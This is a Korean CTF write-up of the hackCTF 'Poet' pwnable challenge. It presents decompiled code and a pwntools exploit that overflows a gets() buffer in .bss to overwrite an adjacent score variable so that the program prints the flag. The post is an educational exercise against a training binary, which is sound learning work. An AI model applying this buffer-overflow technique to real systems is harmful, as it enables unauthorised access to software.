---
layout: post
title:  "[hackCTF]Poet"
date:   2020-02-18
---

hackCTF pwnable 13번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_ bss_start, 0LL, 2, 0LL);
  puts(s);
  while ( 1 )
  {
    get_poem();
    get_author();
    rate_poem();
    if ( score == 1000000 )
      break;
    puts(asc_400D78); "음.. (중략) 다시 시도해 주세요!" 출력
  }
  reward();
}
```

## ida - get_author
```c
__int64 get_author()
{
  printf(&byte_400C38); // "이 시의 저자는 누구입니까?" 출력
  return gets(&author);
}
```

## ida - get_poem
```c
__int64 get_poem()
{
  __ int64 result; // rax

  printf("Enter :\n> ");
  result = gets(poem);
  score = 0;
  return result;
}
```

## ida - rate_poem
```c
int rate_poem()
{
  char dest; // [rsp+0h] [rbp-410h]
  char * s1; // [rsp+408h] [rbp-8h]

  strcpy(&dest, poem);
  for ( s1 = strtok(&dest, " \n"); s1; s1 = strtok(0LL, " \n") )
  { // 시를 행 단위로 자름
    if ( !strcmp(s1, "ESPR")
      || !strcmp(s1, "eat")
      || !strcmp(s1, "sleep")
      || !strcmp(s1, "pwn")
      || !strcmp(s1, "repeat")
      || !strcmp(s1, "CTF")
      || !strcmp(s1, "capture")
      || !strcmp(s1, "flag") )
    {
      score += 100; // 위의 단어 중 하나라도 들어가면 +100
    }
  }
  return printf(asc_400BC0, poem, (unsigned int)score);
}
```

## ida - reward
```c
void __noreturn reward()
{
  char s; // [rsp+0h] [rbp-90h]
  FILE * stream; // [rsp+88h] [rbp-8h]

  stream = fopen("./flag.txt", "r");
  fgets(&s, 128, stream);
  printf(format, &author, &s); // flag 출력
  exit(0);
}
```

처음엔 get_poem이나 get_author, rate_poem의 ret을 덮어서 문제를 해결하려 했다. poem이나 author은 .bss 영역에 존재하므로 ret을 덮을 수 없었다. 대신 score의 값을 1000000로 변조하고자 했다.

author는 .bss:00000000006024A0에 위치하고 score는 .bss:00000000006024E0에 위치한다. author을 입력 받을 때 score 값까지 덮으면 될 것 같다. 주의해야 할 점은 main에서 score과 비교하는  1000000은 int형이므로 payload를 작성할 때 1000000에 해당하는 문자열로 변환해야 한다.

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3012)

payload = "A"*(0x6024E0-0x6024A0) + p32(0xF4240) # 1000000 = 0xF4240

p.recvuntil("> ")

p.sendline("asdf")

p.recvuntil("> ")

p.sendline(payload)

p.interactive()
```

## 결과
![1301](https://drive.google.com/uc?id=1N2P6ySBqL7V_xx4a-1eJ5y1TBQcsuFUX)
